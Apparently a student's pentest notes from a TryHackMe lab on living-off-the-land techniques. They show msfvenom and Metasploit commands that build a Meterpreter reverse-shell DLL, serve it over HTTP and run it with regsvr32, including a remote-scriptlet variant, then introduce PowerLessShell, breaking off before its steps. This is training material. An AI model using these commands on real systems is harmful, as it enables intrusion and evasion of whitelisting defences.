## Table of Contents

- [Regsvr32 #regsvr32](#regsvr32\#regsvr32)

#LoL 
#LivingOffTheLand 
#windows 
#regsvr32
# Regsvr32 #regsvr32 

Regsvr32 is a Microsoft command-line tool to register and unregister Dynamic Link Libraries (DLLs)  in the Windows Registry. The regsvr.exe binary is located at:
```powershell
C:\Windows\System32\regsvr32.exe for the Windows 32 bits version
C:\Windows\SysWOW64\regsvr32.exe for the Windows 64 bits version
```
	regsvr32.exe binary can be used to execute binarie and bypass the windows application whitelisting. 
	Uses Windows trusted Components to run commands.


1. Create Metasploit DLL using `msfvenom`
	`msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll`
2. `msfconsole -q`
3. `use exploit/multi/handler`
4. `set payload windows/meterpreter/reverse_tcp`
5. `set LHOST ATTACK_BOX_IP`
6. `SET_LPORT`


Note that we specified the output type as DLL using the-f argument. Once the malicious DLL file is generated, we need to deliver the payload to the victim machine. We will do this by using a webserver to serve the DLL file on our attacking machine as follows,

Terminal

```shell-session
user@machine$ python3 -m http.server 1337
```

From the victim machine, visit the webserver of the attacking machine on port 1337 that we specify. Note that this port can be changed with your choice!

On the victim machine, once the file DLL file is downloaded, we execute it using regsvr32.exe  as follows,

Command Prompt

```shell-session
C:\Users\thm> c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll
or
C:\Users\thm> c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
```

With the second option, which is a more advanced command, we instruct the regsvr32.exe to run:

- /s: in silent mode (without showing messages)
- /n: to not call the DLL register server
- /i:: to use another server since we used /n
- /u: to run with unregister method


To use the shortcut modification technique, we can set the target section to execute files using:

- Rundll32
- Powershell
- Regsvr32
- Executable on disk

The attached figure shows an example of a shortcut modification technique, where the attacker modified the Excel target section to execute a binary using rundll32.exe. We choose to execute a calculator instead of running the Excel application. Once the victim clicks on the Excel shortcut icon, the calc.exe is executed. For more information about shortcut modification, you may check [this](https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md) GitHub repo.

No PowerShell!

In 2019, Red Canary published a threat detection report stating that PowerShell is the most used technique for malicious activities. Therefore, Organizations started to monitor or block powershell.exe from being executed. As a result, adversaries find other ways to run PowerShell code without spawning it.![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/239e633cdb273be86d1077949539cb38.png)

PowerLessShell is a Python-based tool that generates malicious code to run on a target machine without showing an instance of the PowerShell process. PowerLessShell relies on abusing the Microsoft Build Engine (MSBuild), a platform for building Windows applications, to execute remote code.

First, let's download a copy of the project from the GitHub repo onto the AttackBox: